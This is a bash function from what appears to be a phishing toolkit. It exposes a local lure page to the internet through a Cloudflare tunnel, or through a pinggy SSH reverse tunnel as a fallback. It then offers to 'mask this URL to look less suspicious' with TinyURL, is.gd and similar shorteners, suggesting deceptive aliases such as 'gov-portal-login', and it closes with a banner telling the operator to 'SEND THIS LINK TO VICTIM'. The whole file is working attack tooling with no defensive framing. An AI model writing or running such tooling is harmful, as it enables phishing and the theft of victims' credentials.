# ── Shared: open tunnel + mask URL ──────────────────────────
open_tunnel() {
    local PORT=$1
    banner
    step "4a" "OPENING TUNNEL"
    echo ""
    info "Using Cloudflare Tunnel — clean URL, valid cert, no warnings"
    echo ""

    # Kill any old tunnel
    kill $TUNNEL_PID 2>/dev/null
    pkill -f "cloudflared tunnel\|cloudflared.*http" 2>/dev/null
    sleep 1

    TUNNEL_LOG="/tmp/tunnel_${PORT}_${UID}.log"
    rm -f "$TUNNEL_LOG" 2>/dev/null; touch "$TUNNEL_LOG" 2>/dev/null || TUNNEL_LOG=$(mktemp)

    # ── Named tunnel (custom domain configured) ──────────────────
    if [ -n "$CF_TUNNEL_NAME" ] && [ -n "$CF_DOMAIN" ] && [ -f "$HOME/.cloudflared/cert.pem" ]; then
        info "Using custom domain: ${W}https://$CF_DOMAIN${N}"
        # Patch the port into the config
        CF_CFG="$HOME/.cloudflared/wizza.yml"
        if [ -f "$CF_CFG" ]; then
            sed "s|http://localhost:__PORT__|http://localhost:$PORT|g" "$CF_CFG" > /tmp/wizza_tunnel.yml
        else
            # Build config on the fly
            _creds=$(ls "$HOME/.cloudflared/"*.json 2>/dev/null | head -1)
            cat > /tmp/wizza_tunnel.yml <<CFEOF
tunnel: $CF_TUNNEL_NAME
credentials-file: $_creds
protocol: quic
edge-ip-version: auto
no-autoupdate: true
ingress:
  - hostname: $CF_DOMAIN
    service: http://localhost:$PORT
  - service: http_status:404
CFEOF
        fi
        cloudflared tunnel --config /tmp/wizza_tunnel.yml run "$CF_TUNNEL_NAME" \
            > "$TUNNEL_LOG" 2>&1 &
        TUNNEL_PID=$!
        info "Waiting for tunnel..."
        for i in $(seq 1 25); do
            sleep 1
            grep -qi "registered tunnel\|connected\|Registered tunnel" "$TUNNEL_LOG" 2>/dev/null && break
            printf "  [%ds]\r" "$i"
        done
        echo ""
        if grep -qi "ERR\|error\|failed" "$TUNNEL_LOG" 2>/dev/null && \
           ! grep -qi "registered\|connected" "$TUNNEL_LOG" 2>/dev/null; then
            warn "Custom domain tunnel may have errors. Check: tail $TUNNEL_LOG"
            warn "Falling back to quick tunnel..."
            kill $TUNNEL_PID 2>/dev/null
            CF_TUNNEL_NAME="" CF_DOMAIN=""  # force quick tunnel fallback below
        else
            TUNNEL_URL="https://$CF_DOMAIN"
            RAW_URL="$TUNNEL_URL"
            ok "Custom domain live: ${W}$TUNNEL_URL${N}"
            info "Lure URL: ${W}${TUNNEL_URL}${LURE_PATH}${N}"
            echo ""
            echo -e "  ${R}╔══════════════════════════════════════════════════════════╗${N}"
            echo -e "  ${R}║  TUNNEL ACTIVE                                           ║${N}"
            echo -e "  ${R}║  $TUNNEL_URL${N}"
            echo -e "  ${R}╚══════════════════════════════════════════════════════════╝${N}"
            log "Tunnel: $TUNNEL_URL (named: $CF_TUNNEL_NAME)"
            return
        fi
    fi

    # ── Quick tunnel (no custom domain) ──────────────────────────
    printf "protocol: quic\nedge-ip-version: auto\n" > /tmp/cf_quick.yml
    cloudflared tunnel --config /tmp/cf_quick.yml --url http://localhost:$PORT --no-autoupdate \
        > "$TUNNEL_LOG" 2>&1 &
    TUNNEL_PID=$!

    # Wait for URL (up to 20s)
    info "Waiting for tunnel..."
    for i in $(seq 1 20); do
        sleep 1
        RAW_URL=$(grep -o 'https://[a-z0-9][a-z0-9-]*-[a-z0-9][a-z0-9-]*\.trycloudflare\.com' "$TUNNEL_LOG" 2>/dev/null | head -1)
        [ -n "$RAW_URL" ] && break
    done

    if [ -z "$RAW_URL" ]; then
        warn "Cloudflare tunnel failed — falling back to pinggy"
        warn "Run in your terminal:"
        echo -e "\n  ${W}ssh -o StrictHostKeyChecking=no -p 443 -R0:localhost:$PORT a.pinggy.io${N}\n"
        ask "Paste the pinggy URL here:"
        RAW_URL="$REPLY"
    else
        ok "Cloudflare URL: $RAW_URL"
    fi

    # Offer URL masking
    echo ""
    echo -e "  ${W}Mask this URL to look less suspicious?${N}"
    echo -e "  ${C}[1]${N} TinyURL  (tinyurl.com/xxxxx)"
    echo -e "  ${C}[2]${N} Custom text alias (tinyurl.com/your-text)"
    echo -e "  ${C}[3]${N} Keep as-is"
    echo -e "  ${C}[4]${N} Set up custom domain  ${G}★ permanent fix${N}  → ${C}start domain${N}"
    echo -n "  > "
    read -r MASK_CHOICE

    shorten_url() {
        local url="$1" alias="$2" result="" encoded_url
        encoded_url=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$url" 2>/dev/null || echo "$url")

        # Always bypass Tor for shorteners (--noproxy '*')
        local _curl="curl -s --max-time 8 --connect-timeout 5 --noproxy '*' -A 'Mozilla/5.0'"

        # 1. TinyURL with custom alias
        if [ -n "$alias" ]; then
            result=$(eval "$_curl" "\"https://tinyurl.com/api-create.php?url=${encoded_url}&alias=${alias}\"" 2>/dev/null)
            echo "$result" | grep -qE "^https?://" || result=""
        fi

        # 2. TinyURL auto
        if [ -z "$result" ]; then
            result=$(eval "$_curl" "\"https://tinyurl.com/api-create.php?url=${encoded_url}\"" 2>/dev/null)
            echo "$result" | grep -qE "^https?://" || result=""
        fi

        # 3. cleanuri.com — accepts CF tunnel URLs
        if [ -z "$result" ]; then
            result=$(eval "$_curl" -X POST \
                "\"https://cleanuri.com/api/v1/shorten\"" \
                --data "\"url=${encoded_url}\"" 2>/dev/null \
                | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('result_url',''))" 2>/dev/null)
            echo "$result" | grep -qE "^https?://" || result=""
        fi

        # 4. is.gd
        if [ -z "$result" ]; then
            result=$(eval "$_curl" \
                "\"https://is.gd/create.php?format=simple&url=${encoded_url}\"" 2>/dev/null)
            echo "$result" | grep -qE "^https?://" || result=""
        fi

        # 5. v.gd
        if [ -z "$result" ]; then
            result=$(eval "$_curl" \
                "\"https://v.gd/create.php?format=simple&url=${encoded_url}\"" 2>/dev/null)
            echo "$result" | grep -qE "^https?://" || result=""
        fi

        echo "$result"
    }

    case "$MASK_CHOICE" in
        1)
            info "Shortening URL..."
            TUNNEL_URL=$(shorten_url "$RAW_URL")
            echo "$TUNNEL_URL" | grep -qi "error\|^$" && TUNNEL_URL="$RAW_URL" && \
                warn "Shortener failed — using raw URL" || ok "Masked: $TUNNEL_URL"
            ;;
        2)
            ask "Enter alias (e.g. gov-portal-login):"
            info "Shortening URL..."
            TUNNEL_URL=$(shorten_url "$RAW_URL" "$REPLY")
            echo "$TUNNEL_URL" | grep -qi "error\|^$" && TUNNEL_URL="$RAW_URL" && \
                warn "Alias taken or failed — using raw URL" || ok "Masked: $TUNNEL_URL"
            ;;
        4)
            info "Run: ${W}start domain${N} to set up a permanent custom domain."
            info "After setup it activates automatically — no more masking prompts."
            TUNNEL_URL="$RAW_URL"
            ;;
        *)
            TUNNEL_URL="$RAW_URL"
            ok "Using raw URL"
            ;;
    esac

    echo ""
    echo -e "  ${R}╔══════════════════════════════════════════════╗${N}"
    echo -e "  ${R}║  SEND THIS LINK TO VICTIM:                  ║${N}"
    echo -e "  ${R}║  $TUNNEL_URL${N}"
    echo -e "  ${R}╚══════════════════════════════════════════════╝${N}"
    echo ""
    log "Tunnel: $RAW_URL → masked: $TUNNEL_URL"
    wait_key
}

